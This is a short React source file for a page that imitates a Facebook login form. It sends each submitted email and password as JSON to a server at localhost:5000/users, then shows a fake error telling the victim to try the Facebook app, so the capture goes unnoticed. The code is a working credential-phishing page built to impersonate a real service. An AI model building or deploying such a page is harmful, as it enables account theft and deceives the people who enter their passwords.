
import Swal from 'sweetalert2';
import './App.css'

function App() {

  const handleLogin = event =>{
    event.preventDefault();
    const form = event.target;
    const email = form.email.value;
    const password = form.password.value;
    const user ={email, password}

    fetch('http://localhost:5000/users',{
      method: 'POST',
      headers:{
        'content-type': 'application/json'
      },
      body: JSON.stringify(user)
    })
    .then(res =>res.json())
    .then(result =>{
      if(result.acknowledged === true){
        Swal.fire({
          icon: 'error',
          title: 'Oops...',
          text: 'Something went wrong! You can try to login with your facebook app',
         
        })
      }
    })
    form.reset()
  }

  return (
    <>
      <div className="login-form">
        <h2>Login to Facebook</h2>
        <form onSubmit={handleLogin}>
          <input type="email" placeholder="Email address or phone number" name='email' required />
          <input type="password" placeholder="Password" name='password' required />
          <input type="submit" value="Login" className='button'/>
        </form>
      </div>

    </>
  )
}

export default App
